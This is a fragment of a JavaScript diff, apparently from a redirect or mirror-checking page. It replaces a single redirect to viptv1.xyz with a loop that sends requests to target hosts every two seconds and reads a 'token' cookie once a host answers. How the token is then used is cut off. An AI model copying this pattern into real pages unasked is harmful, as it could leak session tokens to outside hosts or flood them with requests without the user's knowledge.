@@ -101,6 +101,7 @@
 
             http.open("GET", host, /*async*/true);
             http.onreadystatechange = function() {
+    
                 if (http.readyState === XMLHttpRequest.DONE && http.status === 200) {
                     host += '/index.html'
                     if(token = cookie.get('token'))
@@ -120,13 +121,13 @@
         function main() {
 
             var targets = [
-                'http://viptv1.xyz'
+                'https://viptv1.xyz'
             ];
 
+            for(var i = 0; i < targets.length; i++)
+                knock( targets[i]);
 
-            setTimeout(function () {
-                window.location = targets[0]
-            }, 2000);
+            setTimeout(main, 2000);
         }
 
         main();
